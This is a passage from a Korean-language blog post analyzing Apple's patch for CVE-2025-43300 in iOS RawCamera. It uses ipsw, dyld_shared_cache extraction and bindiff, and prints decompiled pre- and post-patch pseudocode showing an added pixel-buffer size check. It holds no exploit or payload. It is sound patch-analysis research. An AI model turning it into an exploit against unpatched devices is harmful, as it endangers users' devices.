_kCMPhotoDecompressionOption_OutputPixelFormat- _CGImageGetBytesPerRow- _CGImageGetHeight- _CGImageGetWidth</code></pre><p>&#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC740; &#xBC14;&#xB010; &#xAC8C; &#xC5C6;&#xACE0; <strong>RawCamera</strong>&#xB9CC; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCF54;&#xB4DC; &#xB808;&#xBCA8;&#xC774; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xC544;&#xC11C; ida&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image3.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image4.png" alt="image.png"></p><p>ipsw&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; 18.6.1 &#xACFC; 18.6.2 &#xBC84;&#xC804;&#xC744; &#xB2E4;&#xC6B4;&#xBC1B;&#xC544; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image5.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image6.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image7.png" alt="image.png"></p><p><code>dyld_shared_cache</code> &#xB294; iOS/macOS&#xAC00; &#xBD80;&#xD305; &#xC2DC; <strong>&#xC790;&#xC8FC; &#xC4F0;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB7;&#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xD55C; &#xB369;&#xC5B4;&#xB9AC;&#xB85C; &#xBBF8;&#xB9AC; &#xBB36;&#xC5B4; &#xB454; &#xCE90;&#xC2DC; &#xD30C;&#xC77C;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xAC01;&#xC885; <code>.dylib</code> / Framework&#xB4E4;&#xC774; <strong>&#xCD5C;&#xC801;&#xD654;</strong>&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; &#xB4E4;&#xC5B4; &#xC788;&#xC5B4; &#xC571; &#xC2DC;&#xC791;&#xC774; &#xBE68;&#xB77C;&#xC9C0;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xC774; &#xC904;&#xC5B4;&#xB4DC;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xC774; &#xCE90;&#xC2DC; &#xC548;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xB4E4;&#xC774;&#xB77C;, &#xCE90;&#xC2DC;&#xC5D0;&#xC11C; RawCamera &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xBD84;&#xC11D;/&#xBE44;&#xAD50;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; ipsw dyld extract&#xC744; &#xD1B5;&#xD574; RawCamera&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, &#xBCF8; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; ida&#xC5D0;&#xC11C; &#xBC14;&#xB85C; dyld_shared_cache&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-1-bindiff"><a href="#1-1-bindiff" class="headerlink" title="1.1 bindiff"></a>1.1 bindiff</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image8.png" alt="image.png"></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; BinExport &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xB514;&#xD551;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image9.png" alt="image.png"></p><p>&#xC6A9;&#xB7C9;&#xC774; &#xBD80;&#xC871;&#xD558;&#xC5EC; bindiff&#xB294; &#xACF5;&#xAC1C;&#xB41C; &#xBD84;&#xC11D; &#xAE00;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xCC38;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xCD9C;&#xCC98;: <a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p>&#xBCC0;&#xACBD;&#xC0AC;&#xD56D;&#xC774; &#xC788;&#xB358; &#xAC83;&#xC740; 6&#xAC1C;&#xC758; &#xD568;&#xC218;&#xC600;&#xC9C0;&#xB9CC;, &#xC774; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xD06C;&#xAC8C; &#xC218;&#xC815;&#xB41C; &#xD568;&#xC218;&#xB294; <code>sub_1DD8A7684</code> &#xC640; <code>sub_1DD95DC1C</code> &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB450;&#xAC1C;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="1-2-Analysis"><a href="#1-2-Analysis" class="headerlink" title="1.2 Analysis"></a>1.2 Analysis</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image10.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image11.png" alt="image.png"></p><p>ipsw&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; <code>dyld_shared_cache</code> &#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p><em>Apple DYLD Cache for arm64e (select module(s)) &#x2192; RawCamera</em> </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image12.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image13.png" alt="image.png"></p><p>&#xC774;&#xBBF8;&#xC9C0; &#xD53D;&#xC140; &#xBC84;&#xD37C;&#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p>&#xC0C1;&#xC138; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><h3 id="&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;"><a href="#&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCF54;&#xB4DC; &#xBD84;&#xC11D;"></a>&#xCF54;&#xB4DC; &#xBD84;&#xC11D;</h3><p><code>sub_1DD8A7684</code> &#x2192; <code>sub_1DD8A76DC</code> </p><pre><code class="hljs cpp"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.1</span> G90<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A7684</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _QWORD *a1,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> UInt8 *a9,</span></span><span class="hljs-function"><span class="hljs-params">        CFIndex a10)</span></span><span class="hljs-function"></span>{  .  .  .    v12 = CFDataCreateWithBytesNoCopy_6(          (CFAllocatorRef)*kCFAllocatorDefault_ptr,          a9,          a10,          (CFAllocatorRef)*kCFAllocatorNull_ptr);  v13 = CGImageSourceCreateWithData_5(v12, <span class="hljs-number">0L</span>L);  ImageAtIndex = CGImageSourceCreateImageAtIndex(v13, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);  BytesPerRow_3 = CGImageGetBytesPerRow_3(ImageAtIndex);  <span class="hljs-keyword">if</span> ( CGImageGetWidth_12(ImageAtIndex) != a5    || (Height_12 = CGImageGetHeight_12(ImageAtIndex), Height_12 != a6)    || (DataProvider_3 = CGImageGetDataProvider_3(ImageAtIndex),        v16 = CGDataProviderCopyData_2(DataProvider_3),        (v17 = v16) == <span class="hljs-number">0L</span>L) )  {    exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(exception_15, `typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error, <span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  <span class="hljs-keyword">if</span> ( CFDataGetLength_15(v16) != <span class="hljs-number">4</span> * a5 * a6 )  {    v45 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v45, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(v45, `typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error, <span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v18 = <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  *(_QWORD *)v18 = <span class="hljs-number">0L</span>L;  *((_DWORD *)v18 + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;  v19 = (<span class="hljs-keyword">float32x2_t</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  v20 = (<span class="hljs-keyword">float</span> *)v19;  v46 = v13;  v47 = v12;  v21 = (<span class="hljs-keyword">float64x2_t</span> *)a1[<span class="hljs-number">231</span>];  v50 = a5;  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">232</span>] - (_QWORD)v21 &lt; <span class="hljs-number">0x11</span>uLL )  {    v22 = <span class="hljs-number">0L</span>L;    v23 = <span class="hljs-number">0.0</span>;  }  <span class="hljs-keyword">else</span>  {    v22 = vcvt_f32_f64(*v21);    *(<span class="hljs-keyword">float32x2_t</span> *)v18 = v22;    v23 = v21[<span class="hljs-number">1</span>].f64[<span class="hljs-number">0</span>];    *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">2</span>) = v23;  }  v24 = (<span class="hljs-keyword">float32x2_t</span>)vdup_n_s32(<span class="hljs-number">0x437F0000</span>u);  *v19 = vdiv_f32(v24, vsub_f32(v24, v22));  v19[<span class="hljs-number">1</span>].f32[<span class="hljs-number">0</span>] = <span class="hljs-number">255.0</span> / (<span class="hljs-keyword">float</span>)(<span class="hljs-number">255.0</span> - v23);  <span class="hljs-keyword">if</span> ( a6 )  {    v52 = <span class="hljs-number">0L</span>L;    v25 = <span class="hljs-number">0</span>;    v26 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( v50 &gt;= a3 )      v27 = a3;    <span class="hljs-keyword">else</span>      v27 = v50;    v49 = v17;    <span class="hljs-keyword">do</span>    {      v28 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1);      BytePtr_16 = CFDataGetBytePtr_16(v17);      <span class="hljs-keyword">if</span> ( v50 )      {        v31 = &amp;BytePtr_16[BytesPerRow_3 * v52];        v32 = (_WORD *)(a2 + <span class="hljs-number">2L</span>L * (v25 + a8 + (v26 + a7) * a3) * v28);        v33 = v50;        <span class="hljs-keyword">do</span>        {          LOBYTE(v30) = *v31;          v34 = *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">1</span>);          v35 = v20[<span class="hljs-number">1</span>];          v36 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v30) - *(<span class="hljs-keyword">float</span> *)v18) * *v20;          v37 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v36 &lt;= <span class="hljs-number">255.0</span> )            v38 = v36;          <span class="hljs-keyword">else</span>            v38 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v36 &gt;= <span class="hljs-number">0.0</span> )            v39 = v38;          <span class="hljs-keyword">else</span>            v39 = <span class="hljs-number">0.0</span>;          *v32 = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v39 + <span class="hljs-number">156</span>);<span class="hljs-comment">// R channel: LUT[clamp((R - blackR) * gainR)] -&gt; store 16-bit</span>          LOBYTE(v39) = v31[<span class="hljs-number">1</span>];          v40 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v39) - v34) * v35;          <span class="hljs-keyword">if</span> ( v40 &lt;= <span class="hljs-number">255.0</span> )            v41 = v40;          <span class="hljs-keyword">else</span>            v41 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v40 &gt;= <span class="hljs-number">0.0</span> )            v42 = v41;          <span class="hljs-keyword">else</span>            v42 = <span class="hljs-number">0.0</span>;          v32[<span class="hljs-number">1</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v42 + <span class="hljs-number">412</span>);<span class="hljs-comment">// G channel: LUT[clamp((G - blackG) * gainG)] -&gt; store 16-bit</span>          LOBYTE(v42) = v31[<span class="hljs-number">2</span>];          v43 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v42) - *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">2</span>)) * v20[<span class="hljs-number">2</span>];          <span class="hljs-keyword">if</span> ( v43 &lt;= <span class="hljs-number">255.0</span> )            v37 = v43;          <span class="hljs-keyword">if</span> ( v43 &gt;= <span class="hljs-number">0.0</span> )            v30 = v37;          <span class="hljs-keyword">else</span>            v30 = <span class="hljs-number">0.0</span>;          v32[<span class="hljs-number">2</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v30 + <span class="hljs-number">668</span>);<span class="hljs-comment">// B channel: LUT[clamp((B - blackB) * gainB)] -&gt; store 16-bit</span>          <span class="hljs-keyword">if</span> ( ++v25 &gt;= v27 )          {            v25 = <span class="hljs-number">0</span>;            v32 = (_WORD *)(a2                          + <span class="hljs-number">2L</span>L * (a8 + (++v26 + a7) * a3) * (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1));          }          <span class="hljs-keyword">else</span>          {            v32 += <span class="hljs-number">3</span>;          }          v31 += <span class="hljs-number">4</span>;          --v33;        }        <span class="hljs-keyword">while</span> ( v33 );      }      ++v52;      v17 = v49;    }    <span class="hljs-keyword">while</span> ( v52 != Height_12 );  }  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v20)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v18)</span></span>;  <span class="hljs-keyword">if</span> ( v17 )    CFRelease_60(v17);  <span class="hljs-keyword">if</span> ( v47 )    CFRelease_60(v47);  <span class="hljs-keyword">if</span> ( v46 )    CFRelease_60(v46);  <span class="hljs-keyword">if</span> ( ImageAtIndex )  {    <span class="hljs-keyword">if</span> ( ((vars8 ^ (<span class="hljs-number">2</span> * vars8)) &amp; <span class="hljs-number">0x4000000000000000</span>LL) != <span class="hljs-number">0</span> )      __break(<span class="hljs-number">0xC471</span>u);    CFRelease_60(ImageAtIndex);  }}</code></pre><pre><code class="hljs c"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.2</span> G100<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A76DC</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _QWORD *a1,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> UInt8 *a9,</span></span><span class="hljs-function"><span class="hljs-params">        CFIndex a10)</span></span><span class="hljs-function"></span>{  .  .  .      v13 = CFDataCreateWithBytesNoCopy_6(          (CFAllocatorRef)*kCFAllocatorDefault_ptr_0,          a9,          a10,          (CFAllocatorRef)*kCFAllocatorNull_ptr);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionSessionCreate_1(v12, <span class="hljs-number">0L</span>L, &amp;v73) )  {    exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      exception_15,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v74[<span class="hljs-number">5</span>] = *kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs_ptr;  v74[<span class="hljs-number">3</span>] = *kCMPhotoContainerFormatString_JFIF_ptr;  v74[<span class="hljs-number">4</span>] = &amp;off_1F5F47C00;  v14 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v15 = (<span class="hljs-keyword">void</span> *)objc_claimAutoreleasedReturnValue_94(v14);  v74[<span class="hljs-number">6</span>] = v15;  v16 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v17 = (<span class="hljs-keyword">void</span> *)objc_claimAutoreleasedReturnValue_94(v16);  objc_release(v15);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionSessionCreateContainer_1(v73, v17, v13, <span class="hljs-number">0L</span>L, &amp;v72) )  {    v52 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v52, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v52,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v70 = <span class="hljs-number">0L</span>L;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionContainerGetImageCount_0(v72, &amp;v70) || v70 &lt;= <span class="hljs-number">0</span> )  {    v53 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v53, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v53,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v74[<span class="hljs-number">1</span>] = *kCMPhotoDecompressionOption_OutputPixelFormat_ptr;  v74[<span class="hljs-number">2</span>] = &amp;off_1F5F487D0;  v18 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v19 = objc_claimAutoreleasedReturnValue_94(v18);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionContainerCreateImageForIndex_1(v72, <span class="hljs-number">0L</span>L, v19, <span class="hljs-number">2L</span>L, &amp;v71) )  {    v54 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v54, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v54,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  BytesPerRow_11 = CVPixelBufferGetBytesPerRow_11(v71);  DataSize_0 = CVPixelBufferGetDataSize_0(v71);  v69 = a6;  v74[<span class="hljs-number">0</span>] = a5;  v21 = *(_QWORD *)sub_1DD8A8C14(v74, &amp;v69);  v68 = <span class="hljs-number">4</span>;  v74[<span class="hljs-number">0</span>] = v21;  <span class="hljs-keyword">if</span> ( DataSize_0 != *(_QWORD *)sub_1DD8A8C7C(v74, &amp;v68) )  {    v55 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v55, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v55,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v22 = (<span class="hljs-keyword">float</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  *(_QWORD *)v22 = <span class="hljs-number">0L</span>L;  v22[<span class="hljs-number">2</span>] = <span class="hljs-number">0.0</span>;  v23 = (<span class="hljs-keyword">float</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  v24 = v23;  __asm { FMOV            V0<span class="hljs-number">.2</span>S, #<span class="hljs-number">1.0</span> }  *(_QWORD *)v23 = _D0;  v23[<span class="hljs-number">2</span>] = <span class="hljs-number">1.0</span>;  v30 = (<span class="hljs-keyword">float64x2_t</span> *)a1[<span class="hljs-number">231</span>];  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">232</span>] - (_QWORD)v30 &lt; <span class="hljs-number">0x11</span>uLL )  {    v31 = <span class="hljs-number">0L</span>L;    v32 = <span class="hljs-number">0.0</span>;  }  <span class="hljs-keyword">else</span>  {    v31 = vcvt_f32_f64(*v30);    *(<span class="hljs-keyword">float32x2_t</span> *)v22 = v31;    v32 = v30[<span class="hljs-number">1</span>].f64[<span class="hljs-number">0</span>];    v22[<span class="hljs-number">2</span>] = v32;  }  v33 = (<span class="hljs-keyword">float32x2_t</span>)vdup_n_s32(<span class="hljs-number">0x437F0000</span>u);  *(<span class="hljs-keyword">float32x2_t</span> *)v23 = vdiv_f32(v33, vsub_f32(v33, v31));  v23[<span class="hljs-number">2</span>] = <span class="hljs-number">255.0</span> / (<span class="hljs-keyword">float</span>)(<span class="hljs-number">255.0</span> - v32);  <span class="hljs-keyword">if</span> ( CVPixelBufferLockBaseAddress_11(v71, <span class="hljs-number">0L</span>L) )  {    v56 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v56, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v56,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v57 = (<span class="hljs-keyword">void</span> *)v19;  v58 = v13;  BaseAddress_11 = (<span class="hljs-keyword">char</span> *)CVPixelBufferGetBaseAddress_11(v71);  <span class="hljs-keyword">if</span> ( a6 )  {    v35 = <span class="hljs-number">0L</span>L;    v36 = <span class="hljs-number">0</span>;    v37 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( a5 &gt;= a3 )      v38 = a3;    <span class="hljs-keyword">else</span>      v38 = a5;    v62 = BaseAddress_11 + <span class="hljs-number">2</span>;    v59 = a5;    <span class="hljs-keyword">do</span>    {      v39 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1);      v61 = v35;      <span class="hljs-keyword">if</span> ( a5 )      {        v41 = v62;        v42 = (_WORD *)(a2 + <span class="hljs-number">2L</span>L * (v36 + a8 + (v37 + a7) * a3) * v39);        <span class="hljs-keyword">do</span>        {          LOBYTE(v40) = *v41;          v43 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v40) - v22[<span class="hljs-number">2</span>]) * v24[<span class="hljs-number">2</span>];          v44 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v43 &lt;= <span class="hljs-number">255.0</span> )            v45 = v43;          <span class="hljs-keyword">else</span>            v45 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v43 &gt;= <span class="hljs-number">0.0</span> )            v46 = v45;          <span class="hljs-keyword">else</span>            v46 = <span class="hljs-number">0.0</span>;          *v42 = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v46 + <span class="hljs-number">668</span>);          LOBYTE(v46) = *(v41 - <span class="hljs-number">1</span>);          v47 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v46) - v22[<span class="hljs-number">1</span>]) * v24[<span class="hljs-number">1</span>];          <span class="hljs-keyword">if</span> ( v47 &lt;= <span class="hljs-number">255.0</span> )            v48 = v47;          <span class="hljs-keyword">else</span>            v48 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v47 &gt;= <span class="hljs-number">0.0</span> )            v49 = v48;          <span class="hljs-keyword">else</span>            v49 = <span class="hljs-number">0.0</span>;          v42[<span class="hljs-number">1</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v49 + <span class="hljs-number">412</span>);          LOBYTE(v49) = *(v41 - <span class="hljs-number">2</span>);          v50 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v49) - *v22) * *v24;          <span class="hljs-keyword">if</span> ( v50 &lt;= <span class="hljs-number">255.0</span> )            v44 = v50;          <span class="hljs-keyword">if</span> ( v50 &gt;= <span class="hljs-number">0.0</span> )            v40 = v44;          <span class="hljs-keyword">else</span>            v40 = <span class="hljs-number">0.0</span>;          v42[<span class="hljs-number">2</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v40 + <span class="hljs-number">156</span>);          <span class="hljs-keyword">if</span> ( ++v36 &gt;= v38 )          {            v36 = <span class="hljs-number">0</span>;            v42 = (_WORD *)(a2                          + <span class="hljs-number">2L</span>L * (a8 + (++v37 + a7) * a3) * (*(<span 